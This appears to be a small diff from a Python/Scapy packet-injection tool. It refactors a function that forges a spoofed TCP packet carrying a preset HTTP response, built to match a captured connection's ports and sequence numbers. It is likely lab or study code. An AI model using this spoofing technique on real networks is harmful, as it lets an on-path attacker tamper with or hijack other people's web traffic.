@@ -23,9 +23,11 @@ def get_tcp_injection_packet(packet):
         ip = packet.getlayer(S.IP)
         tcp = packet.getlayer(S.TCP)
         ip_pkt = S.IP(dst=ip.src, src=ip.dst)
+        tcp_pkt = S.TCP(dport=ip.sport,sport=ip.dport, flags="AF", seq=tcp.ack, ack=tcp.seq+1)
+        http_pkt = S.Raw(load=RESPONSE)
+
         # craft a http repsonse packet (contained in ip and tcp layers)
-        response_pkt = ip_pkt / S.TCP(dport=ip.sport,sport=ip.dport,
-            flags="AF", seq=tcp.ack, ack=tcp.seq+1) / S.Raw(load=RESPONSE)
+        response_pkt = ip_pkt / tcp_pkt / http_pkt
         return response_pkt
 
 def injection_handler(packet):
